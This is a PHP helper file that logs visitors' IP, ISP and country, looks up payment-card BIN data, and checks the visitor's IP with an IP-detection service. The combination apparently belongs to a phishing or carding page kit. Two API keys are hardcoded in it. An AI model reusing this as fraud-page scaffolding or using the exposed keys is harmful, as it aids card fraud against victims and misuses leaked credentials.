<?php

if (!function_exists('fetch_ip_data')) {
    function fetch_ip_data($ip) {
        $url = "http://ipwhois.app/json/" . $ip;

        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => 5,
        ]);
        $response = curl_exec($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        if ($http_code !== 200 || !$response) {
            error_log("Failed to fetch IP data for: $ip");
            return null;
        }

        return json_decode($response, true);
    }
}

if (!function_exists('log_event')) {
    function log_event($message = "VISIT") {
        date_default_timezone_set('Asia/Jakarta');
        $ip = $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';
        if ($ip === '127.0.0.1' || $ip === '::1') {
            $ip = '8.8.8.8';
        }

        $ip_info = fetch_ip_data($ip);

        $time = date('h:i A');
        $log_entry = [
            'JAM' => $time,
            'IP' => $ip,
            'ISP' => $ip_info['isp'] ?? 'UNKNOWN',
            'NEGARA' => $ip_info['country'] ?? 'UNKNOWN',
            'BENDERA' => $ip_info['country_flag'] ?? 'UNKNOWN',
            'INFO' => $message
        ];

        file_put_contents(
            __DIR__ . '/visit_log.jsonl',
            json_encode($log_entry) . PHP_EOL,
            FILE_APPEND
        );
    }
}

if (!function_exists('get_ip_info')) {
    function get_ip_info() {
        date_default_timezone_set('Asia/Jakarta');

        $ip = $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';
        if ($ip === '127.0.0.1' || $ip === '::1') {
            $ip = '8.8.8.8';
        }

        $ip_info = fetch_ip_data($ip);

        return [
            'ip' => $ip,
            'isp' => $ip_info['isp'] ?? 'UNKNOWN',
            'country' => $ip_info['country'] ?? 'UNKNOWN',
            'flag' => $ip_info['country_flag'] ?? 'UNKNOWN',
        ];
    }
}

if (!function_exists('get_bin_info')) {
    /**
     * Get BIN info from iinapi.com
     * @param string $bin
     * @param string $apiKey
     * @return array|null
     */
    function get_bin_info($bin, $apiKey) {
        $apiKey = 'TGPdgzpGJz20js59EES2jsRSV5zAcX5n';
        $url = "https://api.iinapi.com/iin?key=$apiKey&digits=$bin";

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

        $response = curl_exec($ch);
        curl_close($ch);

        $data = json_decode($response, true);

        if (!$data || !$data['valid'] || empty($data['result'])) {
            return null;
        }

        return $data['result'];
    }
}

$string_acak = bin2hex(random_bytes(35));
$apiKey = 'lJRCv7Xam1u4LjSJE2dxii5hHITfeqCr';
$ip = $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';

if (!function_exists('get_browser_name')) {
    function get_browser_name($user_agent) {
        if (stripos($user_agent, 'Firefox') !== false) return 'Firefox';
        if (stripos($user_agent, 'Edg') !== false) return 'Edge';
        if (stripos($user_agent, 'Chrome') !== false) return 'Chrome';
        if (stripos($user_agent, 'Safari') !== false) return 'Safari';
        if (stripos($user_agent, 'Opera') !== false || stripos($user_agent, 'OPR/') !== false) return 'Opera';
        if (stripos($user_agent, 'MSIE') !== false || stripos($user_agent, 'Trident/7') !== false) return 'Internet Explorer';
        return 'Unknown';
    }
}

if (!function_exists('get_device_type')) {
    function get_device_type($user_agent) {
        if (preg_match('/mobile/i', $user_agent)) return 'Mobile';
        if (preg_match('/tablet/i', $user_agent)) return 'Tablet';
        return 'Desktop';
    }
}

$url = "https://api.ipdetective.io/ip/$ip";

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
$response = curl_exec($ch);
curl_close($ch);

$data = json_decode($response, true);

?>